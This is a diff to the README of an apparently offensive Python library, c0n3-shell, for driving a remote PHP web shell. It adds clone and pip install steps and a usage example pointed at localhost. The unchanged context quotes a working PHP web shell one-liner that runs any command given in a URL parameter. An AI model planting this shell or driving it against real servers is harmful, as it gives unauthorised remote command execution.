@@ -22,12 +22,24 @@ That library is intended to be used when you have a remote php shell accepting c
 <?php passthru($_GET['cmd']); ?>
 ...
 ```
-To use it, create a simple script, set the target url and various other options.
+
+To use it:
+
+Clone the repository, then pip install requirements and c0n3shell:
+
+```
+git clone https://github.com/lrk/c0n3-shell
+cd c0n3-shell
+pip install -r requirements.txt
+pip install .
+```
+
+Now you can use it in your script:
 ```
 #!/usr/bin/env python
-import c0n3shell
+from c0n3shell import *
 
-shell = c0n3shell.C0n3Shell(url='http://127.0.0.1/index.php')
+shell = C0n3Shell(url='http://127.0.0.1/index.php')
 shell.cmdloop()
 ```
 
